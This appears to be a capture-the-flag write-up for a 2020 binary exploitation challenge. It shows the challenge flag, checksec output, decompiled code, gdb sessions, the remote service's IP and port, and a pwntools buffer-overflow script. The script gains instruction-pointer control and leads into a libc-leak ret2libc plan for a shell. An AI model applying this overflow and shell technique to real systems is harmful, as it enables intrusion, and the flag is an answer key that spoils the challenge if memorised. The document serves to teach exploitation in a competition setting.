# PWN1

Status: Solved
Flag: `ncct{m3_w4nt_c00k13$_and_41m0nd_m1lk}`

With all binaries, want to start with checking the security structures
```
$ checksec pwn_me
[*] '/home/ubuntu/CCT_2020/PWN/pwn1/pwn_me'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Alright with PIE and NX, we are in for a bit of a treat possibly, but no canary so overflows are possibly.

Ok so now we just run the executable to see what we are working with
```
$ chmod u+x pwn_me
$ ./pwn_me
0x7fc9d969bca0
Cookie Monster ONLY Wants...
PROMPT>ello
PROMPT>^C
```
So we have some sort of address put out, a message, then a never eneding prompt. Does this same behavior happen on the remote service"

```
$ ping www.cybercompetitionteam.com
64 bytes from 64.227.23.177 (64.227.23.177): icmp_seq=1 ttl=38 time=8.87 ms
$ nc 64.227.23.177 1337
0x7f9a13971ca0
Cookie Monster ONLY Wants...
PROMPT>
```
Yep, behavior is the same.

Pumping the binary into Ghidra we see on line 62
```
printf("%p\n",*chunks[7]);
```
This is the pointer being putout, which is pointer partway into this stack buffer.

Dropping this into gdb to manipulate the win funciton:
```
$ gdb pwn_me
> disass main
> b *main+494
> r
> set $rax=1
> c
Segmentation fault
```
So something is happening with the pointers it is referencing if we try and jump it. This tells me we may have to play by the game of the binary, rather than going for an overflow.

In Ghidra in the check cookies function we see
```
    iVar1 = strcmp(input,"snickerdoodles");
    if (iVar1 == 0) {
      iVar1 = 0;
    }
    else {
      iVar1 = strcmp(input,"oatmeal");
      if (iVar1 == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = strcmp(input,"gingersnap");
        if (iVar1 == 0) {
          iVar1 = 0;
        }
        else {
          iVar1 = strcmp(input,"shortbread");
          if (iVar1 == 0) {
            iVar1 = 0;
          }
          else {
            iVar1 = strcmp(input,"butter");
            if (iVar1 == 0) {
              iVar1 = 0;
            }
            else {
              iVar1 = strcmp(input,"molasses");
              if (iVar1 == 0) {
                iVar1 = 0;
              }
              else {
                iVar1 = strcmp(input,"sugar");
                if (iVar1 == 0) {
                  iVar1 = 0;
                }
                else {
                  iVar1 = strcmp(input,"sugar");
                  if (iVar1 == 0) {
                    iVar1 = 0;
                  }
                  else {
                    iVar1 = strcmp(input,"sugar");
                    if (iVar1 == 0) {
                      iVar1 = 0;
                    }
                    else {
                      iVar1 = strcmp(input,"almond");
                      if (iVar1 == 0) {
                        iVar1 = 1;
                      }
                      else {
                        iVar1 = strcmp(input,"toffee");
                        if (iVar1 == 0) {
                          iVar1 = 0;
                        }
                        else {
                          iVar1 = strcmp(input,"maple");
                          if (iVar1 == 0) {
                            iVar1 = 0;
                          }
                          else {
                            iVar1 = strcmp(input,"fluffernutter");
                            if (iVar1 == 0) {
                              iVar1 = 0;
                            }
                            else {
                              iVar1 = 0;
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return iVar1;
}
```

So lets see where entering this into the funciton works for us
```
$ gdb pwn_me
> b get_cookie
> r
snickerdoodles
```
So as long as I have a space afte snickerdoodles, I am fine. So it is sending me back into the function. Let's see whet this all looks like when I enter the inputs it is looking for

```
$ ./pwn_me
0x7fb480ae5ca0
Cookie Monster ONLY Wants...
PROMPT>almond


Segmentation fault (core dumped)
```
Alright, that is interesting, what is happening here?
```
$ gdb pwn_me 
> b *main+494 //right after the return from get_cookie
> r
```

So the `memcpy` call puts the input into another address ... boom, there it is. The puts call (`*main+549) prints everything after the space in almond, so we just need to overflow that until we get to the flag. 

Wait no, we want shell, not a flag. Maybe it is a printf vulnerability?  

Ok, we soldier on, why is the segfault happening? 
```
$ gdb pwn_me
> b *main+0
> reg
RBP  0x555555555620 (__libc_csu_init)
> b *main+559 // the leave of main
> si
> x/dx $rsp
0x00000
```

So something is happening here where the stack is shifting causing the segfault, the question is, can we control that?

Well, lets see if we can overwite rip, get us some options.

Boom, got it with pwntools
```
from pwn import *

p = process("./pwn_me")
payload = "almond "
payload += "A"*417
payload += "B"*8
p.sendline(payload)
print(p.recv())
```

So we have RIP control, we are going to need to leak an address to figure out libc.

Alright, so were is this address pointing?
```
$ python hack.py
0x7f42b752bca0
$ gdb -p=123475
> vmmap 
 0x7f42b752b000     0x7f42b752d000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
```

Ok, so is this somehwere in the plt or the GOT? Nope, I went through and followed the GOT and the PLT from puts, this is nowhere near there. Where is this? Well thats exactly the thing, it is a libc address. 

So let's see if this address is consistent in libc? 
| PID | Printed Addr | Puts Addr | Difference |
|--|-|-|-|
|11495| `0x7fcff38ffca0`| `0x00007fcff3624070`| 2997296 |
|11511| `'0x7f742f59fca0` | `0x00007f742f2c4070` | 2997296 |

Got it, so we have a libc addr straight up given to us, what next? Ret2CSU. For that, we are going to need the base address of libc.


| PID | Printed Addr | LIBC Base Addr | Difference |
|--|-|-|-|
|11580| `0x7fd22f8a1ca0`| `0x7fd22f4b6000`| 4111520 |
|11596| `0x7f3f0fb3eca0`| `0x7f3f0f753000`| 4111520 |

Actually, not doing Ret2CSU, rather a simple `system("/bin/sh")` call. 

Having some issues.... oh, just stack alignment. Throw in an empty ret.
